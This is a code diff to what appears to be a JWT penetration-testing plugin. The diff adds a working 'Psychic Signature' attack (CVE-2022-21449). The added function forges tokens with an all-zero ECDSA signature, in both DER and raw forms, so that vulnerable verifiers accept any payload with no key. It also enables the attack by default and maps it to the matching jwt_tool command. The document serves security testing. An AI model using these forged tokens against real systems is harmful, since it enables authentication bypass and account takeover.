@@ -1243,6 +1243,7 @@ var DEFAULT_CONFIG = {
   enabledAttacks: {
     none: true,
     nullSig: true,
+    psychicSig: true,
     algConfusion: true,
     embeddedJwk: true,
     // Off by default: these require the user to configure & host a JWKS URL first.
@@ -2142,6 +2143,44 @@ async function buildWeakSecretAttacks(parsed, config, originalToken) {
   return results;
 }
 
+// packages/backend/src/attacks/psychicSig.ts
+var DER_ZERO_SIG = "MAYCAQACAQA";
+var RAW_SIG_BYTES = {
+  ES256: 64,
+  ES384: 96,
+  ES512: 132
+};
+function buildPsychicSigAttacks(parsed) {
+  const alg = parsed.header.alg || "";
+  if (!alg.startsWith("ES")) return [];
+  const results = [];
+  const originalJWT = `${parsed.headerB64}.${parsed.payloadB64}.${parsed.signatureB64}`;
+  const es256Header = { ...parsed.header, alg: "ES256" };
+  results.push({
+    id: nanoid(),
+    technique: "psychicSig",
+    techniqueName: "Psychic Signature (ES256, DER r=s=0)",
+    description: 'CVE-2022-21449: forges the token with an all-zero ECDSA signature \u2014 the DER SEQUENCE { INTEGER 0, INTEGER 0 } ("MAYCAQACAQA") \u2014 and alg=ES256. ECDSA verifiers that fail to reject r=0/s=0 (e.g. Java 15\u201318) accept it for any payload with no key required. This is jwt_tool\'s exact `-X p` token.',
+    modifiedJWT: `${b64urlEncode(JSON.stringify(es256Header))}.${parsed.payloadB64}.${DER_ZERO_SIG}`,
+    timestamp: Date.now(),
+    originalJWT
+  });
+  const rawLen = RAW_SIG_BYTES[alg];
+  if (rawLen) {
+    const rawSig = b64urlEncode(Buffer.alloc(rawLen));
+    results.push({
+      id: nanoid(),
+      technique: "psychicSig",
+      techniqueName: `Psychic Signature (${alg}, raw r\u2016s = 0)`,
+      description: `CVE-2022-21449: keeps alg=${alg} and uses an all-zero raw r||s signature (${rawLen} zero bytes \u2014 the RFC 7518 JWS encoding). Complements the DER variant for libraries that parse the JWS signature as raw bytes rather than DER.`,
+      modifiedJWT: `${parsed.headerB64}.${parsed.payloadB64}.${rawSig}`,
+      timestamp: Date.now(),
+      originalJWT
+    });
+  }
+  return results;
+}
+
 // packages/backend/src/index.ts
 async function attackJwt(sdk, requestId, config) {
   const sessionId = Math.random().toString(36).slice(2);
@@ -2202,6 +2241,7 @@ async function attackJwt(sdk, requestId, config) {
     if (cfg.enabledAttacks.embeddedJwk) await tryMerge("embeddedJwk", () => buildEmbeddedJWKAttacks(parsed, rsaKeyPair));
     if (cfg.enabledAttacks.kidInject) await tryMerge("kidInject", () => buildKIDInjectionAttacks(parsed));
     if (cfg.enabledAttacks.claimTamper) await tryMerge("claimTamper", () => buildClaimTamperAttacks(parsed));
+    if (cfg.enabledAttacks.psychicSig) await tryMerge("psychicSig", () => buildPsychicSigAttacks(parsed));
     if (cfg.enabledAttacks.weakSecret) {
       await tryMerge("weakSecret", () => buildWeakSecretAttacks(parsed, cfg, originalJWT));
     }
@@ -2749,7 +2789,8 @@ var BYPASS_TITLES = {
   x5uSpoof: "JWT 'x5u' header spoofing accepted",
   kidInject: "JWT 'kid' header injection accepted",
   claimTamper: "JWT claim tampering accepted (signature not enforced)",
-  weakSecret: "JWT signed with weak/guessable secret accepted"
+  weakSecret: "JWT signed with weak/guessable secret accepted",
+  psychicSig: "JWT psychic signature (CVE-2022-21449) accepted"
 };
 function secretBase64(pem, encoding) {
   const norm = pem.replace(/\r\n/g, "\n");
@@ -2785,6 +2826,8 @@ ${J} ${orig} -X k -pk /tmp/jwt_pubkey`;
       return `${J} ${orig} -X a`;
     case "nullSig":
       return `${J} ${orig} -X n`;
+    case "psychicSig":
+      return `${J} ${orig} -X p`;
     case "embeddedJwk":
       return `${J} ${orig} -X i`;
     case "jkuSpoof":
@@ -2834,6 +2877,7 @@ ${J} ${orig} -S ${hsAlg} -p '${r.hmacSecret}'`;
 var ALL_ATTACKS = [
   "none",
   "nullSig",
+  "psychicSig",
   "algConfusion",
   "embeddedJwk",
   "jkuSpoof",
